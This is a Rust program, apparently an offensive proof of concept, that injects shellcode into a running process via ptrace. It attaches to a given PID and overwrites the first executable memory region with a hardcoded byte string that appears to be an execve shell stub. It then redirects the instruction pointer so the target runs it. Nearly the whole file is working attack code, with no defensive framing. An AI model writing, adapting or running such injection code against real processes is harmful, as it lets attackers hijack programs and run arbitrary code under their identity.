use nix::sys::ptrace;
use nix::unistd::Pid;

fn main() {
    let shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05\x00\x72\x00\x2f\x70";
    let payload_size = shellcode.len();

    let args: Vec<String> = std::env::args().collect();

    let pid = Pid::from_raw(
        args.get(1)
            .unwrap_or_else(|| {
                eprintln!("Usage: {} <PID>", args[0]);
                std::process::exit(1);
            })
            .parse::<i32>()
            .unwrap_or_else(|e| {
                eprintln!("ERROR: {e}");
                std::process::exit(1);
            }),
    );

    // dbg!(&pid);
    const BLUE: &str = "\x1b[34m";
    const RESET: &str = "\x1b[00m";

    println!("[{BLUE}*{RESET}] Attaching to the process with PID: {pid}");

    ptrace::attach(pid).unwrap_or_else(|e| {
        eprintln!("ERROR: Could not attach to the process, root privileges required: {e}");
        std::process::exit(1);
    });
    nix::sys::wait::wait().unwrap();

    let proc_maps = std::fs::read_to_string(format!("/proc/{pid}/maps")).unwrap_or_else(|e| {
        eprintln!("ERROR: proc/maps file could not be read: {e}");
        std::process::exit(1);
    });

    // dbg!(&proc_maps);

    let mut mem_addr = "";
    for line in proc_maps.lines() {
        let perms = line.split(' ').nth(1).unwrap();
        if perms.contains('x') {
            mem_addr = line.split('-').next().unwrap();
            break;
        }
    }

    // dbg!(&mem_addr);

    let mem_ptr = usize::from_str_radix(mem_addr, 16).unwrap() as *const u8;

    println!("[{BLUE}*{RESET}] Found section mapped with r-xp permissions");

    // NOTE: maybe we should save the old register state?
    let mut regs = ptrace::getregs(pid).unwrap();

    println!("[{BLUE}*{RESET}] Injecting payload at address 0x{mem_addr}");

    for i in (0..payload_size).step_by(8) {
        unsafe {
            // let ptr = shellcode.as_ptr().add(i);
            // let ptr = usize::from_str_radix(shellcode, 16).unwrap() as *const u8;
            // dbg!(&ptr);
            let mut shellcode_data: [u8; 8] = [0; 8];
            shellcode_data.copy_from_slice(&shellcode[i..i + 8]);
            ptrace::write(
                pid,
                mem_ptr.add(i) as *mut core::ffi::c_void,
                // ptr as *mut core::ffi::c_void,
                u64::from_le_bytes(shellcode_data) as *mut core::ffi::c_void,
            )
            .unwrap();
        }
    }

    println!("[{BLUE}*{RESET}] Jumping to the injected code");

    regs.rip = mem_ptr as u64;

    ptrace::setregs(pid, regs).unwrap();

    ptrace::cont(pid, None).unwrap();

    println!("[{BLUE}*{RESET}] Succesfully injeced and jumped to the code");
}
